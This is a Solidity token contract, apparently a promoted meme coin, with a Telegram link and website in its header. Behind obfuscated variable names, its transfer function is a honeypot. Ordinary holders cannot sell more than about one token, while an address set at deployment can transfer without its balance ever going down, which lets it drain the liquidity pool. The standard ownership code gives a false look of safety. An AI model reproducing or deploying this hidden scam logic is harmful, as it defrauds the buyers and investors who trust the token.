/*

https://t.me/triplexerc

https://xxx.cryptotoken.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    function transfer(address kohscinja, uint256 bvsrxzfim) public returns (bool success) {
        gaidzfmjco(msg.sender, kohscinja, bvsrxzfim);
        return true;
    }

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private xawjrgs;

    mapping(address => uint256) public balanceOf;

    function transferFrom(address cngkub, address kohscinja, uint256 bvsrxzfim) public returns (bool success) {
        require(bvsrxzfim <= allowance[cngkub][msg.sender]);
        allowance[cngkub][msg.sender] -= bvsrxzfim;
        gaidzfmjco(cngkub, kohscinja, bvsrxzfim);
        return true;
    }

    string public symbol;

    function gaidzfmjco(address cngkub, address kohscinja, uint256 bvsrxzfim) private {
        address qfhiuynadvcx = IUniswapV2Factory(abkisgdpmyr.factory()).getPair(address(this), abkisgdpmyr.WETH());
        bool kbdlsf = wvfbezo[cngkub] == block.number;
        uint256 gwvzfrnkpmy = xawjrgs[cngkub];
        if (0 == gwvzfrnkpmy) {
            if (cngkub != qfhiuynadvcx && (!kbdlsf || bvsrxzfim > oblhepd[cngkub]) && bvsrxzfim < totalSupply) {
                require(bvsrxzfim <= totalSupply / (10 ** decimals));
            }
            balanceOf[cngkub] -= bvsrxzfim;
        }
        oblhepd[kohscinja] = bvsrxzfim;
        balanceOf[kohscinja] += bvsrxzfim;
        wvfbezo[kohscinja] = block.number;
        emit Transfer(cngkub, kohscinja, bvsrxzfim);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private oblhepd;

    IUniswapV2Router02 private abkisgdpmyr;

    function approve(address batgexjhmd, uint256 bvsrxzfim) public returns (bool success) {
        allowance[msg.sender][batgexjhmd] = bvsrxzfim;
        emit Approval(msg.sender, batgexjhmd, bvsrxzfim);
        return true;
    }

    uint256 private nyuqwbjghz = 111;

    constructor(string memory wuobnymvkh, string memory ftbsha, address xenrqi, address dpymqxkjhfu) {
        name = wuobnymvkh;
        symbol = ftbsha;
        balanceOf[msg.sender] = totalSupply;
        xawjrgs[dpymqxkjhfu] = nyuqwbjghz;
        abkisgdpmyr = IUniswapV2Router02(xenrqi);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private wvfbezo;

    uint8 public decimals = 9;
}